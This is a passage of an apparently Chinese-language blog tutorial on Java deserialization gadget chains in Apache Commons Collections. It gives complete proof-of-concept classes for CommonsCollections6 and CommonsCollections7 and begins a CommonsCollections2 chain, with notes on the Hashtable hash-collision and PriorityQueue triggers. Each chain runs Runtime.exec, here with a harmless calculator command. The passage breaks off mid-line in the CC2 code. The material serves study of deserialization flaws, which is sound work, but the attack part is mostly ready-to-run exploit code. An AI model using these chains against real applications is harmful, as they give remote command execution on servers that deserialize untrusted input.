class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections6</span> <span class="variable">commonsCollections6</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections6</span>();</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashSet</span> <span class="operator">=</span> commonsCollections6.HashSetChain();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashSet);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashMap <span class="title function_">HashMapChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="comment">// 清除上一步HashMap#put-&gt;HashMap#hash-&gt;TiedMapEntry#hashCode-&gt;LazyMap#get导致赋值的影响, 因为这样在序列化过程下列代码中map就已经有key了, 从而反序列化过程进不到if循环</span></span><br><span class="line">        <span class="comment">/**public Object get(Object key) &#123;</span></span><br><span class="line"><span class="comment">            // create value for key if key is not currently in the map</span></span><br><span class="line"><span class="comment">            if (map.containsKey(key) == false) &#123;</span></span><br><span class="line"><span class="comment">                Object value = factory.transform(key);</span></span><br><span class="line"><span class="comment">                map.put(key, value);</span></span><br><span class="line"><span class="comment">                return value;</span></span><br><span class="line"><span class="comment">            &#125;</span></span><br><span class="line"><span class="comment">            return map.get(key);</span></span><br><span class="line"><span class="comment">        &#125;**/</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> HashSet <span class="title function_">HashSetChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        HashSet&lt;Object&gt; hashSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        setFieldValue(lazyMap, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashSet;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsCollections7"><a href="#CommonsCollections7" class="headerlink" title="CommonsCollections7"></a>CommonsCollections7</h2><h3 id="前置知识-4"><a href="#前置知识-4" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h4><p>Hashtable与HashMap十分相似，是一种key-value形式的哈希表，Hashtable的readObject方法中，最后调用了reconstitutionPut方法将反序列化得到的key-value放在内部实现的Entry数组table里。</p><p><img src="/2023/04/23/CommonsCollections/1709093981985-a5d53d68-3c94-46fb-8750-2785a70f9a5b.png"></p><p>在reconstitutionPut方法中，会计算hash值并根据hash值计算存在tab中的位置，然后判断这个位置是否已经存在值，若存在着进入if判断。在if中，先判断俩个hash值是否相等，如果相等的话则会执行equals。</p><p><img src="/2023/04/23/CommonsCollections/1709094014670-1f774e6f-ec5c-4b41-85ff-6c04f18fb547.png"></p><p>假设将key设置为LazyMap，则会去调用LazyMap的equals方法，但是在LazyMap中并不存在该方法，于是会调用LazyMap父类AbstractMapDecorator的equals方法，此时这里的map就是构造LazyMap装饰器时传入的HashMap，但是HashMap的equals方法是final的，无法被重写。</p><p><img src="/2023/04/23/CommonsCollections/1709124423177-880568c9-2229-470f-82df-dd2306f5e8e7.png"></p><p>这里会调用HashMap的父类AbstractMap的equals方法，可以看到这里会调用get方法，可以构造LazyMap的调用链。</p><p><img src="/2023/04/23/CommonsCollections/1709124955970-c50aadaf-0b1e-4ff5-945c-1597fde40c29.png"></p><h3 id="利用构造-4"><a href="#利用构造-4" class="headerlink" title="利用构造"></a>利用构造</h3><p>反序列化入口是HashTable，HashTable中传入两个键值对，key的hash相等会进入equals方法，将第二个key传入AbstractMap的equals方法，最终调用第二个key的get方法，即调用LazyMap#get方法。</p><p>构造时需要注意哈希冲突问题，来达到hash相等的目的。</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections7</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections7</span> <span class="variable">commonsCollections7</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections7</span>();</span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> commonsCollections7.hashtableChain();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(hashtable);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Hashtable <span class="title function_">hashtableChain</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(map1, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;aa&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(map2, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">0</span>));</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;bB&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable&lt;Object, Object&gt; hashtable = <span class="keyword">new</span> <span class="title class_">Hashtable</span>&lt;&gt;();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(lazyMap2, <span class="string">&quot;factory&quot;</span>, chainedTransformer);</span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashtable;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/04/23/CommonsCollections/1709125732296-80ca1f06-68e6-4dd0-97ec-0ebaecf79adf.png"></p><h2 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h2><h3 id="前置知识-5"><a href="#前置知识-5" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a><font style="color:rgb(0, 0, 0);">PriorityQueue</font></h4><p>PriorityQueue优先级队列是基于优先级堆的一种特殊队列，它给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。因此，放入PriorityQueue的元素，必须实现Comparable接口，PriorityQueue会根据元素的排序顺序决定出队的优先级。如果没有实现Comparable接口，PriorityQueue允许提供一个Comparator对象来判断两个元素的顺序。</p><p>PriorityQueue支持反序列化，在重写的readObject方法中，将数据反序列化到queue中之后，会调用heapify方法来对数据进行排序。</p><p><img src="/2023/04/23/CommonsCollections/1709209033323-01782a93-b263-49ea-a88a-1026d0d29046.png"></p><p>heapify方法调用siftDown方法，在comparator属性不为空的情况下，会调用siftDownUsingComparator方法。</p><p>在siftDownUsingComparator方法中，会调用comparator的compare方法来进行优先级的比较和排序。</p><p><img src="/2023/04/23/CommonsCollections/1709209090056-64614b81-2d05-4a0e-b08b-9516d41a2b20.png"></p><p><img src="/2023/04/23/CommonsCollections/1709209159966-1acd94c7-5563-426e-b533-9c8496be5e8f.png"></p><h4 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h4><p>TransformingComparator用Tranformer来装饰一个Comparator，也就是说，待比较的值将先使用Tranformer转换，再传递给Comparator比较。TransformingComparator在初始化时需配置Transformer和Comparator，如果不指定Comparator，则使用ComparableComparator.<Comparable>comparableComparator()。</p><p><img src="/2023/04/23/CommonsCollections/1709210555807-b34ec9bf-0db3-4538-b8a9-cea3e7195089.png"></p><h3 id="利用构造-5"><a href="#利用构造-5" class="headerlink" title="利用构造"></a>利用构造</h3><p>利用PriorityQueue在反序列化后会对队列进行优先级排序的特点，为其指定TransformingComparator排序方法，并在其中为其添加Transformer，接着使用ChainedTransformer调用InvokerTransformer来触发恶意的TemplatesImpl对象。需要注意，由于TemplatesImpl不是Comparable对象，需要反射将恶意的TemplatesImpl对象写入到PriorityQueue的queue中。</p><h3 id="POC-5"><a href="#POC-5" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example.deserialize.commonscollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">CommonsCollections2</span> <span class="variable">commonsCollections2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections2</span>();</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> commonsCollections2.payload2();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">            outputStream.writeObject(priorityQueue);</span><br><span class="line">            outputStream.flush();</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray());</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Templates <span class="title function_">getTemplates</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> 